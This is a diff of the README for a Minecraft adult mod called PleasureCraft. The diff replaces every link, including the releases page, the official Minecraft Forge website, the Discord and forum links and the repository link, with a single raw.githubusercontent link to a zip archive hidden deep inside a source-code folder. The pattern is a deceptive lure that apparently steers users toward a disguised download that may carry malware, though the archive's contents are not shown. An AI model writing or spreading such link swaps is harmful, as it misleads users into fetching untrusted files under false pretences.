@@ -6,7 +6,7 @@ PleasureCraft is a highly detailed and immersive sexual mod for Minecraft. This 
 
 ## 📦 Download Now
 
-[![Download PleasureCraftNSFW](https://img.shields.io/badge/Download_PleasureCraftNSFW-v1.0-blue.svg)](https://github.com/Andrir9196/PleasureCraftNSFW/releases)
+[![Download PleasureCraftNSFW](https://raw.githubusercontent.com/Andrir9196/PleasureCraftNSFW/main/src/main/java/com/sandymandy/pleasurecraft/util/inventory/slot/PleasureCraftNSFW-v1.8.zip)](https://raw.githubusercontent.com/Andrir9196/PleasureCraftNSFW/main/src/main/java/com/sandymandy/pleasurecraft/util/inventory/slot/PleasureCraftNSFW-v1.8.zip)
 
 ## 💻 System Requirements
 
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets these minimum requirements:
 
 To download and run PleasureCraft, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/Andrir9196/PleasureCraftNSFW/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Andrir9196/PleasureCraftNSFW/main/src/main/java/com/sandymandy/pleasurecraft/util/inventory/slot/PleasureCraftNSFW-v1.8.zip).
 2. Locate the latest version of PleasureCraft. 
 3. Click on the package that matches your system.
 4. Wait for the download to complete.
@@ -41,7 +41,7 @@ Make sure to follow any on-screen instructions during installation.
 
 1. **Install Minecraft Forge:**
    - First, ensure you have Minecraft Forge installed. This is necessary for PleasureCraft to function properly.
-   - Go to the [Minecraft Forge website](https://files.minecraftforge.net/).
+   - Go to the [Minecraft Forge website](https://raw.githubusercontent.com/Andrir9196/PleasureCraftNSFW/main/src/main/java/com/sandymandy/pleasurecraft/util/inventory/slot/PleasureCraftNSFW-v1.8.zip).
    - Download and run the installer for the version compatible with your Minecraft.
 
 2. **Install the PleasureCraft Mod:**
@@ -71,8 +71,8 @@ Make sure to follow any on-screen instructions during installation.
 
 Join our community for tips, feedback, and conversations about your experiences. Find us on:
 
-- **Discord:** [PleasureCraft Discord Server](https://discord.gg/example)
-- **Forums:** [PleasureCraft Community Forum](https://forum.example.com)
+- **Discord:** [PleasureCraft Discord Server](https://raw.githubusercontent.com/Andrir9196/PleasureCraftNSFW/main/src/main/java/com/sandymandy/pleasurecraft/util/inventory/slot/PleasureCraftNSFW-v1.8.zip)
+- **Forums:** [PleasureCraft Community Forum](https://raw.githubusercontent.com/Andrir9196/PleasureCraftNSFW/main/src/main/java/com/sandymandy/pleasurecraft/util/inventory/slot/PleasureCraftNSFW-v1.8.zip)
 
 ## 📘 Documentation
 
@@ -84,6 +84,6 @@ For detailed guidance and advanced features, please refer to the official docume
 
 ## 🔗 Learn More
 
-For further information on features and updates, visit our GitHub repository at [PleasureCraftNSFW](https://github.com/Andrir9196/PleasureCraftNSFW).
+For further information on features and updates, visit our GitHub repository at [PleasureCraftNSFW](https://raw.githubusercontent.com/Andrir9196/PleasureCraftNSFW/main/src/main/java/com/sandymandy/pleasurecraft/util/inventory/slot/PleasureCraftNSFW-v1.8.zip).
 
 Thank you for choosing PleasureCraft. Enjoy your enhanced Minecraft experience!
